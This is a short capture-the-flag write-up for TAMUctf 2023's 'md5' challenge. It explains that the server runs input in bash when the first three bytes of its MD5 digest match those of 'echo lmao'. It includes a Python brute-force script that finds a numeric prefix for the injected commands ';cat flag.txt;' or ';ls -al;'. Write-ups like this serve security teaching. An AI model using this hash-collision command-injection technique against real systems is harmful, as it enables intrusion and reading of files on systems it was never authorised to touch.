
### MD5


![md5](https://github.com/Hed6eH0g/ctf/blob/main/2023/tamuctf/md5/md5_0.png)


Since the function `md5sum` just return a portion of the digest of given bytes `b'echo lmao'` and our input is passed toward the shell (`out = subprocess.check_output(['/bin/bash', '-c', cmd])`), we can inject a shell command using hash collision.
First, we tried to inject `ls` with a numeric suffix, it did not work as desired (the server did not respond the result of `ls`).
Thus, we executed `ls -al` and `cat flag.txt` with a numeric prefix that were explored by the following script.

```
import hashlib

target = hashlib.md5(b'echo lmao').digest()[0:3]

i = 0
# cmd = ';ls -al;'
cmd = ';cat flag.txt;'
query = cmd
while hashlib.md5(query.encode()).digest()[0:3] != target:
  query = f'{i}' + cmd 
  i += 1

print(query)
print(hashlib.md5(query.encode()).digest())
```
